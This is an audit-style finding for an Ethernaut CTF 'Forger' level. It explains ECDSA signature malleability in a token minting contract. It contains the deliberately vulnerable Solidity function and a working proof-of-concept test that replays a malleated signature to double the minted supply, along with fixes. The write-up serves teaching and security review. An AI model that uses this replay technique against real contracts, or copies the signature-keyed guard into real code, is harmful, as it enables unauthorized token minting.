# [High] Forger: ECDSA malleability lets an attacker replay the owner's mint signature

## Summary
Target: `ForgerToken` (Ethernaut 2025 Forger level, local training fixture).
The contract mints tokens from an owner-signed voucher. A leaked owner signature can be replayed **indefinitely** via ECDSA malleability (`s → n - s`, `v → 28`), because the one-time guard keys on the signature bytes (`signatureUsed[keccak256(signature)]`) instead of the message hash. Result: unlimited token minting.

## Severity
**High** — attacker can mint an unbounded token supply (in the fixture, 200 ether from a single 100-ether voucher).

## Vulnerability Details
```solidity
function createNewTokensFromOwnerSignature(
    address receiver, uint256 amount, uint256 salt, uint256 deadline, bytes calldata signature
) external {
    require(block.timestamp < deadline, "expired");
    bytes32 messageHash = keccak256(abi.encode(receiver, amount, salt, deadline));
    address signer = _recover(messageHash, signature);
    require(signer == owner, "bad signer");
    require(!signatureUsed[keccak256(signature)], "already used");
    signatureUsed[keccak256(signature)] = true;
    _mint(receiver, amount);
}
```
ECDSA malleability: `(r, s, v)` and `(r, n - s, 28)` both recover to the same signer. The guard hashes the **signature bytes**, so the malleated signature yields a different `keccak256` key and passes the "already used" check. The message hash (the thing actually signed) is identical — the signature is semantically a replay.

Note: the raw `_recover` (ecrecover) does not enforce low-s. OZ 5.x `ECDSA.recover` does, which is why the fixture models the vulnerable (OZ 4.6-era) behaviour.

## Proof of Concept
```solidity
function testForgerExploit() public {
    // owner-signed voucher: receiver=0x1D96..., amount=100 ether, deadline=max
    // 1) valid signature -> mint 100 ether
    token.createNewTokensFromOwnerSignature(receiver, 100 ether, salt, deadline, sig);
    // 2) malleated signature (r, n-s, 28) -> SAME message hash, different sig hash
    bytes32 sM = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
    token.createNewTokensFromOwnerSignature(receiver, 100 ether, salt, deadline, abi.encodePacked(r, sM, uint8(28)));
    assertEq(token.totalSupply(), 200 ether); // > 100 ether goal reached
}
```

## Impact
- Unbounded token minting from a single leaked signature.
- In a real protocol: inflation of a reward/rebate token, or draining a mint-gated pool.

## Recommendation / Fix
1. Enforce **low-s** (`require(s <= n/2)`) — the standard ECDSA malleability fix.
2. Key the one-time guard on the **message hash** (`messageHash`), not the signature bytes.

## References
- OZ 4.6 `ECDSA.recover` (no low-s) vs OZ 5.x (low-s enforced).
- ECDSA malleability: SEC1 / EIP-2 (low-s requirement).
